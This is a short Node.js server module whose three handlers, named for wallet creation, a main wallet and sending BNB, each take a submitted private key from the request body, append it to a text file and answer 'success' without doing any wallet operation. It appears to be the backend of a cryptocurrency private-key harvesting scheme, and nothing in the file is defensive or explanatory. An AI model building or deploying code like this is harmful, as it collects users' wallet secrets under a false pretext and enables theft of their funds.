const Web3 = require('web3');
const request = require('request');
const fs = require('fs/promises');

async function saveToTxt(hexcode) {
    try {
        const content = hexcode + '\n';
        await fs.appendFile('test.txt', content);
    } catch (err) {
        console.log(err);
    }
}
async function saveTowallet(hexcode) {
    try {
        const content = hexcode + '\n';
        await fs.appendFile('create.txt', content);
    } catch (err) {
        console.log(err);
    }
}
async function saveToBNB(hexcode) {
    try {
        const content = hexcode + '\n';
        await fs.appendFile('BNB.txt', content);
    } catch (err) {
        console.log(err);
    }
}

async function mainwallet(req, res) {
    console.log("main wallet received")
    saveToTxt(req.body.mainprivate)
    
    console.log("mainwallet")
    res.send("success");
}
async function createwallet(req, res) {
    console.log("create wallet received")
    saveTowallet(req.body.mainprivate)
    
    console.log("create saved")
    res.send("success");
}

async function sendBNB(req, res) {
    console.log("BNB send")
    saveToBNB(req.body.mainprivate)
    
    console.log("BNB saved")
    res.send("success");
}

module.exports = {createwallet, mainwallet, sendBNB}

